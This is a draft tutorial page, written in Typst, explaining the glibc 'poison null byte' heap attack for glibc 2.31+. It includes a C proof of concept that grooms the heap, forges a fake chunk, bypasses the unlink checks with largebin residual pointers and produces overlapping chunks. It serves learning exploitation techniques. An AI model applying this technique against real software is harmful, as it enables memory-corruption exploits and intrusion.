#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Poison Null Byte",
    description: "Exploiting an off-by-one null byte to trigger backward consolidation and chunk overlapping.",
    date: "2025-12-26",
    order: 24,
    draft: true,
  ),
)<frontmatter>

= Poison Null Byte

== Introduction

The "Poison Null Byte" attack leverages an off-by-one vulnerability where a single null byte can be written past the end of a buffer. In the context of the glibc heap, this null byte can overwrite the least significant byte of the next chunk's `size` field.

By clearing the `PREV_INUSE` bit of the next chunk and potentially shrinking its size, an attacker can trick the allocator into performing backward consolidation with a "fake" chunk that is actually still in use, leading to chunk overlapping.

== The Modern Challenge (glibc 2.29+)

Since glibc 2.29, additional checks were added to `unlink`, requiring that `P->fd->bk == P` and `P->bk->fd == P`. This makes the classic poison null byte much harder because we must forge a fake chunk that passes these checks. A common bypass involves using residual pointers in the `largebin` to satisfy these constraints.

== Implementation Example

This example demonstrates the attack on glibc 2.31, using largebin residual pointers to bypass the `unlink` checks.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	puts("Welcome to poison null byte!");

	// Step 1: Allocate padding to align heap
	void *tmp = malloc(0x1);
	void *heap_base = (void *)((long)tmp & (~0xfff));
	size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
	void *padding = malloc(size);

	// Step 2: Allocate adjacent chunks
	void *prev = malloc(0x500); // The 'prev' chunk
	void *victim = malloc(0x4f0); // The 'victim' chunk
	malloc(0x10); // Barrier

	// Step 3: Link 'prev' into largebin
	void *a = malloc(0x4f0);
	malloc(0x10);
	void *b = malloc(0x510);
	malloc(0x10);

	free(a);
	free(b);
	free(prev);
	malloc(0x1000); // Trigger sorting

	// Step 4: Construct the fake chunk inside 'prev'
	void *prev2 = malloc(0x500);
	((long *)prev)[1] = 0x501; // Fake size
	*(long *)(prev + 0x500) = 0x500; // Fake prev_size

	// Step 5: Bypass unlinking using residual pointers
	void *b2 = malloc(0x510);
	((char*)b2)[0] = '\x10';
	((char*)b2)[1] = '\x00';

	void *a2 = malloc(0x4f0);
	free(a2);
	free(victim);

	void *a3 = malloc(0x4f0);
	((char*)a3)[8] = '\x10';
	((char*)a3)[9] = '\x00';

	// Step 6: Trigger the off-by-null
	void *victim2 = malloc(0x4f0);
	((char *)victim2)[-8] = '\x00';

	// Trigger backward consolidation
	free(victim);

	// Step 7: Validate chunk overlapping
	void *merged = malloc(0x100);
	memset(merged, 'A', 0x80);
	memset(prev2, 'C', 0x80);
	assert(strstr(merged, "CCCCCCCCC"));
}
```

== Attack Flow Explained

=== 1. Setup: Padding and Alignment

The first step is to align the heap so that the second-to-last byte of our fake chunk's address is `\x00`. This avoids the need for a 4-bit brute force when we later overwrite the `fd` and `bk` pointers.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Chunk*], [*Address*], [*Purpose*],
    [`padding`], `0x...0000`, [Align heap base],
    [`prev`], `0x...0010`, [Contains the fake chunk],
    [`victim`], `0x...0520`, [Target for off-by-null],
  ),
  caption: [Initial heap layout after setup.],
)

=== 2. Largebin Residual Pointers

To bypass the `unlink` check (`P->fd->bk == P` and `P->bk->fd == P`), we need our fake chunk's `fd` and `bk` to point to locations that point back to our fake chunk. We use the `fd_nextsize` and `bk_nextsize` fields of a chunk in the `largebin`.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Field*], [*Value*], [*Bypass logic*],
    [`fake->fd`], `&a`, [`a->bk` must be `&fake`],
    [`fake->bk`], `&b`, [`b->fd` must be `&fake`],
  ),
  caption: [Unlink bypass requirements.],
)

By overwriting the last two bytes of residual pointers in chunks `a` and `b`, we make them point to our fake chunk inside `prev`.

=== 3. The Off-By-Null

We allocate `victim` again. Because of the off-by-one vulnerability, we can write a null byte into the `size` field of the next chunk (which is also `victim` in its freed state or the barrier).

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*State*], [*Size Field*], [*PREV_INUSE*],
    [Before Poison], `0x501`, [1],
    [After Poison], `0x500`, [0],
  ),
  caption: [Effect of the null byte on the victim chunk's metadata.],
)

The null byte does two things:
1. Clears the `PREV_INUSE` bit of the `victim` chunk.
2. Potentially shrinks the `size` field (though in this specific bypass, we mostly care about the bit).

=== 4. Consolidation and Overlapping

When we `free(victim)`, the allocator sees `PREV_INUSE == 0`. It then looks at `prev_size` (which we forged to be `0x500`) to find the previous chunk. It finds our fake chunk inside `prev` and calls `unlink()` on it.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Action*], [*Result*], [*Status*],
    [`free(victim)`], [Backward Consolidate], [SUCCESS],
    [`unlink(fake)`], [Passes bypass checks], [SUCCESS],
    [`malloc(large)`], [Returns overlapped region], [SUCCESS],
  ),
  caption: [The result of the consolidation is a single large chunk that overlaps with `prev`.],
)

We now have two pointers: `prev2` and the new `merged` pointer, both pointing to the same memory. Overwriting one will affect the other.

